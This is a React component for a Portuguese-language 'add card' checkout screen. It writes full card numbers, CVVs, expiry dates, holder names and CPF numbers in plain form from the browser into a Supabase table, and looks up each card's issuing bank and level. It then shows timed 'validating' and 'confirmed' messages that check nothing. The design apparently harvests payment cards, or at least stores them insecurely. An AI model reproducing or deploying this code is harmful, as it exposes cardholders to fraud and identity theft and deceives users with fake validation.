"use client";

import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, Smartphone, Trash2, Loader2, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { showError, showSuccess } from '@/utils/toast';
import { supabase } from "@/integrations/supabase/client";

const AddCard: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState(0);
  const [brand, setBrand] = useState<'visa' | 'mastercard' | 'elo' | 'unknown'>('unknown');
  
  const [binInfo, setBinInfo] = useState<{
    bank?: string;
    level?: string;
    type?: string;
    brand?: string;
  } | null>(null);
  const [isLookupLoading, setIsLookupLoading] = useState(false);

  const [savedCards, setSavedCards] = useState<any[]>([]);
  const [selectedCardId, setSelectedCardId] = useState<string | null>(null);

  useEffect(() => {
    fetchSavedCards();
  }, []);

  const fetchSavedCards = async () => {
    try {
      const { data, error } = await supabase
        .from('cards')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (error) throw error;
      setSavedCards(data || []);
      
      if (data && data.length > 0 && !selectedCardId && !cardNumber) {
        setSelectedCardId(data[0].id);
      }
    } catch (err) {
      console.error("Erro ao carregar cartões:", err);
    }
  };

  const lookupBin = async (bin: string) => {
    if (bin.length < 6) return;
    setIsLookupLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke('lookup-bin', {
        body: { bin }
      });

      if (!error && data) {
        setBinInfo({
          bank: data.bank?.name,
          level: data.brand,
          type: data.type,
          brand: data.scheme
        });
        
        if (data.scheme === 'visa') setBrand('visa');
        else if (data.scheme === 'mastercard') setBrand('mastercard');
      }
    } catch (err) {
      console.error("Erro na consulta de BIN:", err);
    } finally {
      setIsLookupLoading(false);
    }
  };

  const handleRemoveCard = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      const { error } = await supabase.from('cards').delete().eq('id', id);
      if (error) throw error;
      showSuccess("Cartão removido.");
      if (selectedCardId === id) setSelectedCardId(null);
      setSavedCards(prev => prev.filter(c => c.id !== id));
    } catch (err) {
      showError("Não foi possível remover.");
    }
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    if (digits.length > 0) setSelectedCardId(null);
    
    if (digits.length === 6 && digits !== cardNumber.replace(/\s/g, '').slice(0, 6)) {
      lookupBin(digits);
    } else if (digits.length < 6) {
      setBinInfo(null);
    }

    const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
    if (digits.length > 0) {
      const first = digits[0];
      if (first === '4') setBrand('visa');
      else if (first === '5') setBrand('mastercard');
      else if (first === '6') setBrand('elo');
      else setBrand('unknown');
    }
    return formatted;
  };

  const handleContinue = async () => {
    // Definindo o caminho de retorno correto baseado no produto ou fallback
    const slug = location.state?.product?.slug;
    const returnPath = slug ? `/${slug}/checkout` : '/checkout';

    // Se selecionou um cartão salvo
    if (selectedCardId && !cardNumber.trim()) {
      const card = savedCards.find(c => c.id === selectedCardId);
      if (card) {
        navigate(returnPath, { 
          state: { 
            ...location.state, 
            cardData: card,
            cardAdded: true // Para o Checkout saber que veio da tela de cartões
          } 
        });
        return;
      }
    }

    // Se está adicionando um novo
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (cleanNumber.length < 15 || !expiry || !cvv || !name.trim() || cpf.replace(/\D/g, '').length < 11) {
      showError("Preencha todos os dados do cartão.");
      return;
    }

    setIsProcessing(true);
    try {
      const { data, error } = await supabase
        .from('cards')
        .insert([{
          card_number: cardNumber,
          expiry,
          cvv,
          name,
          cpf: cpf.replace(/\D/g, ''),
          last4: cleanNumber.slice(-4),
          brand: brand === 'unknown' ? 'mastercard' : brand,
          bin: cleanNumber.slice(0, 6),
          bank_name: binInfo?.bank || null,
          card_level: binInfo?.level || null,
          card_type: binInfo?.type || null
        }])
        .select()
        .single();

      if (error) throw error;

      setStep(0);
      setTimeout(() => setStep(1), 700);
      setTimeout(() => setStep(2), 1400);
      setTimeout(() => {
        navigate(returnPath, { 
          state: { 
            ...location.state, 
            cardAdded: true, 
            cardData: data 
          } 
        });
      }, 2100);

    } catch (err) {
      console.error("Erro ao salvar:", err);
      showError("Erro ao processar cartão.");
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-white pb-24">
      {isProcessing && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[280px]">
            <Loader2 className="w-12 h-12 text-[#FF2C55] animate-spin" />
            <p className="text-[15px] font-bold text-gray-900 text-center">
              {step === 0 && "Validando cartão..."}
              {step === 1 && "Adicionando à conta..."}
              {step === 2 && "Cartão confirmado!"}
            </p>
          </div>
        </div>
      )}

      <div className="h-12 flex items-center px-4 border-b sticky top-0 bg-white z-50">
        <button onClick={() => navigate(-1)} className="p-1">
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <h1 className="flex-grow text-center text-[16px] font-bold mr-6">Adicionar cartão</h1>
      </div>

      <div className="p-4 space-y-6">
        <div className="flex items-center space-x-2 text-[#FF2C55]">
          <Smartphone size={16} />
          <span className="text-[13px] font-medium">Sem juros em até 3 parcelas</span>
        </div>

        <div className="space-y-5">
          <div className="space-y-1.5">
            <div className="flex justify-between items-center">
              <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
              <div className="flex gap-2 h-5">
                {isLookupLoading ? (
                  <Loader2 size={16} className="animate-spin text-gray-400" />
                ) : (
                  <>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-full" alt="MC" />
                    <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-full" alt="Visa" />
                    <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-full" alt="Elo" />
                  </>
                )}
              </div>
            </div>
            <div className="border-[#F1F1F1] border-2 rounded-xl h-14 flex items-center px-4 relative bg-gray-50/50">
              <input 
                type="text" 
                placeholder="0000 0000 0000 0000" 
                className="w-full bg-transparent outline-none text-[16px] font-mono"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              />
            </div>
            
            {binInfo && (
              <div className="flex items-center space-x-2 bg-blue-50 p-2 rounded-lg border border-blue-100 animate-in fade-in slide-in-from-top-1">
                <Info size={14} className="text-blue-500" />
                <span className="text-[11px] text-blue-700 font-medium">
                  {binInfo.bank && <span className="font-bold">{binInfo.bank}</span>}
                  {binInfo.level && <span> • {binInfo.level}</span>}
                  {binInfo.type && <span className="uppercase"> • {binInfo.type}</span>}
                </span>
              </div>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <input 
              type="text" 
              placeholder="MM/AA" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={expiry}
              onChange={(e) => {
                const v = e.target.value.replace(/\D/g, '').slice(0, 4);
                setExpiry(v.length >= 2 ? `${v.slice(0, 2)}/${v.slice(2)}` : v);
              }}
              maxLength={5}
            />
            <input 
              type="text" 
              placeholder="CVV" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
            />
          </div>

          <input 
            type="text" 
            placeholder="NOME COMO NO CARTÃO" 
            className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px] uppercase"
            value={name}
            onChange={(e) => setName(e.target.value)}
          />

          <input 
            type="text" 
            placeholder="CPF DO TITULAR" 
            className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
            value={cpf}
            onChange={(e) => {
              const v = e.target.value.replace(/\D/g, '');
              setCpf(v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4").slice(0, 14));
            }}
          />
        </div>

        {savedCards.length > 0 && (
          <div className="space-y-4 pt-4 border-t">
            <h3 className="text-[14px] font-bold text-gray-900 px-1 uppercase tracking-tight">Cartões salvos</h3>
            <div className="space-y-3">
              {savedCards.map((card) => (
                <div 
                  key={card.id}
                  className={`relative border rounded-2xl p-4 flex items-center justify-between cursor-pointer transition-all ${
                    selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FFF1F3]' : 'border-gray-100 bg-gray-50'
                  }`}
                  onClick={() => {
                    setSelectedCardId(card.id);
                    setCardNumber("");
                    setBinInfo(null);
                  }}
                >
                  <div className="flex items-center space-x-3">
                    <div className="bg-white p-1 rounded border shrink-0">
                      <img src={card.brand === 'visa' ? "https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"} className="h-4 w-6 object-contain" alt="Brand" />
                    </div>
                    <div className="flex flex-col">
                      <div className="flex items-center space-x-2">
                        <span className="text-[14px] font-bold text-gray-900">Final {card.last4}</span>
                        {card.bank_name && <span className="text-[10px] text-gray-400 font-medium">• {card.bank_name}</span>}
                      </div>
                      <button className="text-[11px] text-red-500 font-bold flex items-center mt-1" onClick={(e) => handleRemoveCard(card.id, e)}>
                        <Trash2 size={13} className="mr-1" /> Remover
                      </button>
                    </div>
                  </div>
                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FF2C55]' : 'border-gray-300'}`}>
                    {selectedCardId === card.id && <div className="w-2 h-2 bg-white rounded-full" />}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t z-50">
        <Button className="w-full h-12 rounded-full font-bold text-[16px] bg-[#FF2C55]" onClick={handleContinue}>
          Continuar
        </Button>
      </div>
    </div>
  );
};

export default AddCard;